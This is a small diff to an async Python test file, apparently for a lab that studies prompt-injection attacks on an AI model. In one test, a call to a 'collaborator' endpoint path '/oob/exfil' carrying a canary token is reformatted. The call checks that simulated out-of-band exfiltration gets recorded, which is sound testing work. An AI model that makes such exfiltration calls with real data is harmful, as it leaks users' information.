@@ -439,7 +439,10 @@ async def test_a_carrier_from_the_content_server_reaches_the_assistant(
 async def test_the_collaborator_records_an_out_of_band_hit(lab: dict[str, str]) -> None:
     async with httpx.AsyncClient(timeout=5.0) as client:
         await client.delete(f"{lab['collaborator']}/hits")
-        await client.get(f"{lab['collaborator']}/oob/exfil", params={"token": "canary"})
+        await client.get(
+            f"{lab['collaborator']}/oob/exfil",
+            params={"token": "canary"},  # pragma: allowlist secret
+        )
         hits = (await client.get(f"{lab['collaborator']}/hits")).json()
 
     assert hits["count"] == 1
